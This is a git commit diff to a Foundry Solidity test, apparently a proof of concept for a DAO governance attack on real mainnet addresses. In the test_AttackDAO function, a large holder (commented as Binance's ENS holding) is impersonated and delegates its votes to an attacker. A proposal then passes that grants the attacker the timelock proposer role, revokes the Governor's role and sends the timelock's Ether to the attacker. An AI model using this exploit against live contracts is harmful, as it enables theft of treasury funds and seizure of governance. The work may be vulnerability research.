94514f3dce81be5974ac2c37c0e8a7bb1398675c
Alexandro T. Netto <alex.t.netto@gmail.com>
2024-04-10 02:48:38 -0300

    test: draining Ether and revoking Governor proposer role

--- test/CancelProposal.t.sol
+++ test/CancelProposal.t.sol
@@ -3,14 +3,12 @@ pragma solidity ^0.8.13;
 
 import { Test, console } from "forge-std/Test.sol";
 import { IGovernor } from "../src/interfaces/IGovernor.sol";
-import { ITimelock } from "../src/interfaces/ITimelock.sol";
 import { IToken } from "../src/interfaces/IToken.sol";
 import { IWallet } from "../src/interfaces/IWallet.sol";
 
 contract CounterTest is Test {
     IToken public token;
     IGovernor public governor;
-    ITimelock public tokenTimelock;
     IWallet public timelock;
     bytes32 public constant TIMELOCK_ADMIN_ROLE = keccak256("TIMELOCK_ADMIN_ROLE");
     bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
@@ -23,41 +21,46 @@ contract CounterTest is Test {
 
         token = IToken(0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72);
         governor = IGovernor(0x323A76393544d5ecca80cd6ef2A560C6a395b7E3);
-        tokenTimelock = ITimelock(0xd7A029Db2585553978190dB5E85eC724Aa4dF23f);
         timelock = IWallet(payable(0xFe89cc7aBB2C4183683ab71653C4cdc9B02D44b7));
 
         labelAddresses();
     }
 
-    function test_BaseConfig() public {
+    function test_BaseConfigChecks() public {
         address tokenInGovernor = governor.token();
         assertEq(tokenInGovernor, address(token));
 
-        bool governorIsProposerInWallet = timelock.hasRole(PROPOSER_ROLE, address(governor));
-        assertTrue(governorIsProposerInWallet);
+        bool governorIsProposer = timelock.hasRole(PROPOSER_ROLE, address(governor));
+        assertTrue(governorIsProposer);
     }
 
     function test_AttackDAO() public {
-        // Delegate from top token holder
-        vm.prank(0xd7A029Db2585553978190dB5E85eC724Aa4dF23f);
+        // Delegate from top token holder (binance, with 4m $ENS in this case)
+        vm.prank(0x5a52E96BAcdaBb82fd05763E25335261B270Efcb);
         token.delegate(voter);
 
         uint256 votingPower = token.getVotes(voter);
-        assertEq(votingPower, 55_004_056_347_480_195_848_226_739);
+        assertEq(votingPower, 4_126_912_192_000_000_000_000_000);
 
         // Need to advance 1 block for delegation to be valid on governor
         vm.roll(block.number + 1);
 
         // Creating a proposal that gives a proposer role to
-        address[] memory targets = new address[](1);
+        address[] memory targets = new address[](3);
         targets[0] = address(timelock);
-        uint256[] memory values = new uint256[](1);
+        targets[1] = address(timelock);
+        targets[2] = voter;
+        uint256[] memory values = new uint256[](3);
         values[0] = 0;
-        bytes[] memory calldatas = new bytes[](1);
+        values[1] = 0;
+        values[2] = 5_370_845_482_402_118_767_544;
+        bytes[] memory calldatas = new bytes[](3);
         calldatas[0] = abi.encodeCall(timelock.grantRole, (timelock.PROPOSER_ROLE(), voter));
+        calldatas[1] = abi.encodeCall(timelock.revokeRole, (timelock.PROPOSER_ROLE(), address(governor)));
+        calldatas[2] = bytes("");
+
         string memory description = "";
         bytes32 descriptionHash = keccak256(bytes(description));
-        console.log(governor.proposalThreshold());
 
         // Governor //
         // Submit malicious proposal
@@ -82,8 +85,7 @@ contract CounterTest is Test {
         assertEq(governor.state(proposalId), 5);
 
         // Calculate proposalId in timelock
-        bytes32 proposalIdInTimelock =
-            timelock.hashOperationBatch(targets, values, calldatas, 0, descriptionHash);
+        bytes32 proposalIdInTimelock = timelock.hashOperationBatch(targets, values, calldatas, 0, descriptionHash);
         assertTrue(timelock.isOperationPending(proposalIdInTimelock));
 
         // Wait the operation in the DAO wallet timelock to be Ready
@@ -94,8 +96,9 @@ contract CounterTest is Test {
         governor.execute(targets, values, calldatas, descriptionHash);
         assertTrue(timelock.isOperationDone(proposalIdInTimelock));
 
-
         assertTrue(timelock.hasRole(PROPOSER_ROLE, voter));
+        assertFalse(timelock.hasRole(PROPOSER_ROLE, address(governor)));
+        assertEq(address(timelock).balance, 0);
         // To cancel the operation, the status needs to be pending and only the PROPOSAL_ROLE can call it
     }
 
